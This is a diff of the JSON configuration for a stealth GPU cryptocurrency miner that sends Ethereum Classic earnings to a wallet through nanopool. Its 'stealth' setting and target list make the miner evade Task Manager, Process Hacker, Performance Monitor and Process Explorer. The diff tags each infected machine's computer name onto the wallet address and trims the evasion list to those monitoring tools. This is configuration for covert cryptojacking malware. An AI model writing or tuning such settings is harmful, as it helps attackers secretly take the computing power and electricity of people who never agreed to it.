@@ -1,9 +1,9 @@
 {
-    "url": "stratum://0xBF2F8b72d11F3D037D90ba75A1011587C5a4F6c8@etc-eu1.nanopool.org:19999",
+    "url": "stratum://`0xBF2F8b72d11F3D037D90ba75A1011587C5a4F6c8.{COMPUTERNAME}`@etc-eu1.nanopool.org:19999",
     "algo": "etchash",
     "max-gpu": 60,
-    "idle-wait": 1,
+    "idle-wait": 2,
     "idle-gpu": 100,
     "stealth": true,
-    "stealth-targets": "Taskmgr.exe,ProcessHacker.exe,perfmon.exe,procexp.exe,procexp64.exe,ModernWarfare.exe,ShooterGame.exe,ShooterGameServer.exe,ShooterGame_BE.exe,GenshinImpact.exe,FactoryGame.exe,farcry3.exe,Borderlands2.exe,EliteDangerous64.exe,PlanetCoaster.exe,Warframe.x64.exe,NMS.exe,csgo.exe,RainbowSix.exe,RainbowSix_BE.exe,CK2game.exe,ck3.exe,stellaris.exe,arma3.exe,arma3_x64.exe,TslGame.exe,ffxiv.exe,ffxiv_dx11.exe,Wow.exe,WowClassic.exe,Overwatch.exe,League of Legends.exe,dota2.exe,r5apex.exe"
+    "stealth-targets": "Taskmgr.exe,ProcessHacker.exe,perfmon.exe"
 }
